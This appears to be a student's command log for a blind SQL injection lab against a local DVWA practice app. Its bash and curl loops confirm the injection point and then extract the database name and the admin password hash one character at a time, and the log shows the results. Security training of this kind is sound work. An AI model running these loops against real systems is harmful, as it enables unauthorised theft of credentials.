# Commands — SQL Injection (Blind) Lab

## 1. Authenticate and establish session

```bash
curl -c cookies.txt -s http://localhost:4280/login.php -o login.html
TOKEN=$(grep -oP "user_token' value='\K[^']+" login.html)

curl -b cookies.txt -c cookies.txt -s http://localhost:4280/login.php \
  -d "username=admin&password=password&Login=Login&user_token=$TOKEN" \
  -o login_result.html

curl -b cookies.txt -c cookies.txt -s http://localhost:4280/security.php \
  -d "security=low&seclev_submit=Submit" -o security_result.html
```

## 2. Establish baseline response

```bash
curl -b cookies.txt -s "http://localhost:4280/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" \
  -o blind_baseline.html
grep -io "user id exists" blind_baseline.html
```
**Result:** `User ID exists`

## 3. Confirm boolean-blind injection point

```bash
# TRUE condition
curl -b cookies.txt -s "http://localhost:4280/vulnerabilities/sqli_blind/?id=1'+AND+'1'='1&Submit=Submit#" \
  -o blind_true.html
grep -io "user id exists" blind_true.html
# Result: "User ID exists"

# FALSE condition
curl -b cookies.txt -s "http://localhost:4280/vulnerabilities/sqli_blind/?id=1'+AND+'1'='2&Submit=Submit#" \
  -o blind_false.html
grep -io "user id exists" blind_false.html
# Result: (no output — confirms boolean signal is distinguishable)
```

## 4. Determine database name length

```bash
for i in $(seq 1 20); do
  RESULT=$(curl -b cookies.txt -s "http://localhost:4280/vulnerabilities/sqli_blind/?id=1'+AND+LENGTH(database())=$i--+-&Submit=Submit#" | grep -io "user id exists")
  if [ -n "$RESULT" ]; then
    echo "Database name length: $i"
    break
  fi
done
```
**Result:** `Database name length: 4`

## 5. Extract database name character-by-character

```bash
DB_NAME=""
for pos in $(seq 1 10); do
  for ascii in $(seq 32 126); do
    RESULT=$(curl -b cookies.txt -s "http://localhost:4280/vulnerabilities/sqli_blind/?id=1'+AND+ASCII(SUBSTRING(database(),$pos,1))=$ascii--+-&Submit=Submit#" | grep -io "user id exists")
    if [ -n "$RESULT" ]; then
      CHAR=$(printf "\\$(printf '%03o' "$ascii")")
      DB_NAME="${DB_NAME}${CHAR}"
      echo "Position $pos: $CHAR"
      break
    fi
  done
done
echo "Extracted database name: $DB_NAME"
```
**Result:** `dvwa`

## 6. Determine admin password hash length

```bash
for i in $(seq 20 40); do
  RESULT=$(curl -b cookies.txt -s "http://localhost:4280/vulnerabilities/sqli_blind/?id=1'+AND+LENGTH((SELECT+password+FROM+users+WHERE+user='admin'))=$i--+-&Submit=Submit#" | grep -io "user id exists")
  if [ -n "$RESULT" ]; then
    echo "Password hash length: $i"
    break
  fi
done
```
**Result:** `Password hash length: 32` (consistent with MD5)

## 7. Extract admin password hash character-by-character

```bash
PASS_HASH=""
for pos in $(seq 1 32); do
  for ascii in $(seq 48 102); do  # narrowed to 0-9,a-f range (MD5 hex charset)
    RESULT=$(curl -b cookies.txt -s "http://localhost:4280/vulnerabilities/sqli_blind/?id=1'+AND+ASCII(SUBSTRING((SELECT+password+FROM+users+WHERE+user='admin'),$pos,1))=$ascii--+-&Submit=Submit#" | grep -io "user id exists")
    if [ -n "$RESULT" ]; then
      CHAR=$(printf "\\$(printf '%03o' "$ascii")")
      PASS_HASH="${PASS_HASH}${CHAR}"
      echo "Position $pos: $CHAR"
      break
    fi
  done
done
echo "Extracted admin password hash: $PASS_HASH"
```
**Result:** `5f4dcc3b5aa765d61d8327deb882cf99` — identical to the hash extracted directly via UNION-based injection in Lab 07, confirming both techniques agree.
